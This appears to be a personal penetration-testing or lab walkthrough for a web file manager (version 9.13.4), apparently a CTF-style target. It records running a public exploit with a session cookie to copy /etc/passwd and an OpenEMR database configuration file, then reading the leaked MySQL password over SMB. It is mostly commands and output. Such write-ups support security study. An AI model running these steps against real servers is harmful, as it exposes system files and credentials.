# 5 :80 /filemanager 9.13.4

```
Using https://www.exploit-db.com/exploits/49359

# we need cookie to run exploit
$ curl -I http://192.168.137.145/filemanager/
HTTP/1.1 200 OK
Date: Sat, 28 Aug 2021 20:21:30 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=36oqbt2bqq0k5beo48ppgpjko3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: last_position=%2F; expires=Sat, 04-Sep-2021 20:21:30 GMT; Max-Age=604800
Content-Type: text/html; charset=UTF-8

$ python3 49359.py http://192.168.137.145 PHPSESSID=36oqbt2bqq0k5beo48ppgpjko3 /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
white:x:1000:1000::/home/white:/bin/sh

# working, file is copied to /filemanage/

# interesting files for openemr
- openemr/sites/default/sqlconf.php

# seems to fail
$ python3 49359.py http://192.168.137.145 PHPSESSID=rdlvrjijua99bpfpkdjc3lvgat /var/www/html/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard


$ python3 49359.py http://192.168.137.145 PHPSESSID=rdlvrjijua99bpfpkdjc3lvgat /var/www/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard

# no file is created in /filemanager/

# we know that we cannot upload .php files but we can view all files via smb
# so changing script to paste_clipboard path=Documents/

# trying same commands
# php files are not viewable via /filemanager/
# have to use smb to check if command is executed
# tried both /var/www/html/openemr/* & /var/www/openemr/*

$ python3 49359.py http://192.168.137.145 PHPSESSID=kflcv2lnisc01ulnjcecin9tmp /var/www/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.137.145 Port 80</address>
</body></html>

smb: \> dir
  .                                   D        0  Sat Aug 28 13:42:06 2021
  ..                                  D        0  Fri Apr  9 08:47:12 2021
  passwd                              N     1607  Sat Aug 28 13:39:43 2021
  sqlconf.php                         N      639  Sat Aug 28 13:42:06 2021
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 08:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 08:47:12 2021


smb: \> more sqlconf.php
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```
